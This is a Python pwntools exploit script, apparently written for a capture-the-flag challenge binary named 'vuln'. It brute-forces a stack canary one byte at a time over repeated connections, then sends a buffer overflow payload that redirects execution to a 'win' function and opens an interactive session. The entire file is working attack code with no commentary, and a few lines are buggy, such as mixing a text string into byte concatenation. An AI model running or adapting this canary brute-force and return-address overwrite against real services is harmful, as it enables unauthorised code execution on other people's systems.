from socket import timeout
from pwn import (
    args,
    gdb,
    remote,
    process,
    cyclic,
    p32,
    u32,
    flat,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def brute_canary():
    needle = b"Ok... Now Where's the Flag?"
    canary = b""
    while len(canary) != 4:
        revert = 0
        for i in range(256):
            if i == 255:
                revert = 1
            if i == 255 and revert:
                canary = "ZONK"

            r = start()
            temp = cyclic(offset_buf) + canary + bytes([i])
            r.sendlineafter(b"> ", str(len(temp)).encode())
            r.sendlineafter(b"> ", temp)
            if r.can_recv_raw(timeout=1):
                if r.recvline().strip() in needle:
                    canary += bytes([i])
                    print(f"Found canary: {canary}")
                    break
            r.close()

    return canary


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "warn"
context.terminal = "kitty"

offset_buf = 64
pad = 84 - (offset_buf + 4)
real_canary = brute_canary()
io = start()

payload = flat(
    {
        offset_buf: [
            real_canary,
            cyclic(pad),
            elf.sym.win,
        ]
    }
)

io.sendlineafter(b"> ", str(len(payload)).encode())
io.sendlineafter(b"> ", payload)

io.interactive()
